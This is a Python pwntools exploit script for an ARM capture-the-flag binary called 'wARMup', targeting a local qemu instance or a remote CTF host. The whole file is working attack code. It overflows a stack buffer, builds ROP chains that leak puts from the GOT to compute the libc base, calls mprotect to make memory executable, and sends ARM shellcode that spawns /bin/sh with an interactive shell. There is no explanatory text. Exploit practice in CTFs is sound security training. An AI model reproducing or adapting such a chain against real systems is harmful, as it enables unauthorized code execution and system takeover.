#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./wARMup'
while True :
	# try :
		if len(sys.argv)==1 :
			# io=process(elfelf)
			io=process(['qemu-arm-static','-L','/home/keer/arm','-g','1234','wARMup'])
			elf=ELF(elfelf)
			libc=ELF('/home/keer/arm/lib/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',29937)
			elf=ELF(elfelf)
			libc=ELF('./libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]

		context.arch=elf.arch

		io.recv()
		pay='a'*0x64+p32(0x0021238)+p32(0x0001052C)
		io.send(pay)
		

		pay=p32(0x0021238)+p32(0x0105AC)+p32(0)
		pay+=p32(elf.got['puts'])+p32(1)+p32(elf.got['puts'])+p32(0)*3
		pay+=p32(0x1058C)+p32(0)*7+p32(0x0001052C)
		pay=pay.ljust(0x64,'\x00')+p32(0x0021238-0x64)+p32(0x00010548)
		io.send(pay)
		libc_base=u32(io.recv(4))-libc.sym['puts']
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		pay=p32(0x0021238)+p32(0x0105AC)+p32(0)
		pay+=p32(0x0021238-0x68+0x48)+p32(1)
		pay+=p32(0x0021000)+p32(0x1000)+p32(7)+p32(0)
		pay+=p32(0x1058C)+p32(0)*7
		pay+=p32(0x0001052C)+p32(libc.sym['mprotect'])
		pay=pay.ljust(0x64,'\x00')+p32(0x0021238-0x64)+p32(0x00010548)
		io.send(pay)
		pause()
		shell='\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
		pay=shell.ljust(0x60)+p32(0x0021238-0x68)*4
		io.send(pay)


		
		success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue